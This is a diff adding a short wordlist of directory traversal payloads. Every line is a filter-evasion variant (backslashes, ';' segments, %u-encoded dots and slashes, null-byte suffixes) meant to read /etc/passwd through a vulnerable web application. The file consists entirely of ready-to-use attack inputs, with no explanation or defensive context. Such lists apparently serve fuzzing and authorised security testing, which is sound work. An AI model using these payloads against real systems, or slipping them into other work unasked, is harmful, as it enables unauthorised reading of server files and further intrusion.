@@ -1,0 +1,12 @@
+../../../../../etc/passwd
+../../../../../etc/passwd%00
+..\..\..\..\..\etc/passwd
+..\..\..\..\..\etc/passwd%00
+..;/..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/etc/passwd%00
+..;\..;\..;\..;\..;\etc/passwd
+..;\..;\..;\..;\..;\etc/passwd%00
+..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd
+..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd%00
+%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
+%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd%00
